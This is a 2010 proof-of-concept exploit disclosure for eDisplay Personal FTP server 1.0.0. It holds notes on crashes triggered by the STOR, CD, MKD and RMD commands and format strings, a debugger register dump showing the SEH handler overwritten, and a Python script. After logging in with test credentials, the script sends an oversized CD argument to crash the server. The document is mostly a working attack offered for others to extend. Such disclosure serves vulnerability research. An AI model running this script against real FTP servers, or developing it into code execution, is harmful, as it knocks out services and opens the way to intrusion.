
# Title: eDisplay Personal FTP server 1.0.0 Multiple Post-Authentication Crash (PoC)
# From: The eh?-Team || The Great White Fuzz (we're not sure yet)
# Found by: loneferret
# Hat's off to dookie2000ca
# Disvovery date: 16/03/2010
# Software link: http://edisplay-personal-ftp-server.software.informer.com/
# Tested on: Windows XP SP3 Professional
# Nod to the Exploit-DB Team
 
# Vendor informed via email : 17/03/2010
 
#THE README PART
#The STOR command will crash the server and overwrite a few interesting CPU registers (as shown below).
#Other commands that will gives similar results are: CD / MKD / RMD They all overwrite SEH in the same
#manner as the STOR command.
#During our research, we discovered many other DoS possibilities. These character combinations (%s & %n)
#are pretty good at crashing this application.
#As always, if someone wishes to take this further go right ahead. Play nice, and remember where you got it from.
#Thank you.
 
 
#SEH chain of main thread
#Address SE handler
#0012C888 41414141
 
#EAX 7EFEFEFE
#ECX 0012FEF8 ASCII "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\AAAAAAAA,,,,AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
#EDX 41414141
#EBX 0139B8D0
#ESP 0012C30C
#EBP 0012C894 ASCII "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...AAAAAAAAAAAAAAAAAAAAAAA\AAAAAAAAAAAAAAAAAA
#ESI 00000000
#EDI 0012FFFD
#EIP 50E14321 FtpSer_1.50E14321
#C 0 ES 0023 32bit 0(FFFFFFFF)
#P 1 CS 001B 32bit 0(FFFFFFFF)
#A 0 SS 0023 32bit 0(FFFFFFFF)
#Z 1 DS 0023 32bit 0(FFFFFFFF)
#S 0 FS 003B 32bit 7FFDF000(FFF)
#T 0 GS 0000 NULL
#D 0
#O 0 LastErr ERROR_SUCCESS (00000000)
#EFL 00010246 (NO,NB,E,BE,NS,PE,GE,LE)
#ST0 empty %#.19L
#ST1 empty %#.19L
#ST2 empty +UNORM 19C4 00000000 7FFDF000
#ST3 empty -NAN FFFF 805970D5 F6B61A24
#ST4 empty -UNORM F000 0012FFA8 7FFDF6CC
#ST5 empty +UNORM 0010 00000000 F6B62000
#ST6 empty 0.0
#ST7 empty 45901.499999999995440
# 3 2 1 0 E S P U O Z D I
#FST 0100 Cond 0 0 0 1 Err 0 0 0 0 0 0 0 0 (LT)
#FCW 137F Prec NEAR,64 Mask 1 1 1 1 1 1
 
#!/usr/bin/python
 
import socket
 
buffer= "\x41" * 270
 
print "Fuzzing CD\r\n"
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('xxx.xxx.xxx.xxx',21))
s.recv(1024)
s.send('USER test\r\n')
s.recv(1024)
s.send('PASS test\r\n')
s.recv(1024)
s.send('CD ' + buffer + '\r\n')
s.recv(1024)
s.send('QUIT\r\n')
s.close


